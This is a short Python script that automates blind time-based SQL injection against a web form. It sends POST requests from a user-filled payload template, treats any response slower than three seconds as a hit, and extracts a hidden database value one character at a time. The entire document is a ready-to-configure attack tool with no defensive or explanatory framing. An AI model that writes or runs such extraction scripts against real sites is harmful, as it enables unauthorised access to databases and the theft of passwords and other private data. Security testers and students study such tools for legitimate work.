# This script helps with blind time based SQL injections
import requests
import sys
import string
import re

def make_request(url, payload, char, verbose):
    
    headers = {"Content-Type": "application/x-www-form-urlencoded"}  # Set content type if needed
    response = requests.post(url, data=payload, headers=headers)
    time = float(response.elapsed.total_seconds())

    if time > 3.0:
        print(f"\n{payload}: ===SUCCESS===")
        return True
    
    else:
        if verbose:
            print(f"\n{payload}: Fail (time = {time})")
        return False


# =======MAIN=======

# CONFIG VARIABLES (User defined)
url = "" # URL to send POST request to
data = ""# POST request payload in full
exclude_chars = [] # If we need to exclude a starting letter so we don't take that path, mention it here. Otherwise, set to []
case_sensitive = True

# STATIC CODE
first_iteration = True
break_outer_loop = False
chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','.','@','#','/']
capital_chars = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
result = ""
end = False

if case_sensitive:
    chars = chars + capital_chars

chars.append('!')

while end == False:
    for char in chars:
        result = result + char
        payload = re.sub(r'\^', result, data)

        if len(exclude_chars) != 0 and first_iteration:
            for exclude in exclude_chars:
                if char == exclude:
                    result = result[:-1]
                    break_outer_loop = True
        
        if break_outer_loop:
            break_outer_loop = False
            continue

        if not(make_request(url, payload, char, True)):
            result = result[:-1]
        else:
            first_iteration = False
            break

        if char == '!':
            if not(make_request(url, payload, char, False)):
                end = True
                break

if result != "":
    print(f"\nPAYLOAD: {result}")
else:
    print(f"\nNO PAYLOAD FOUND")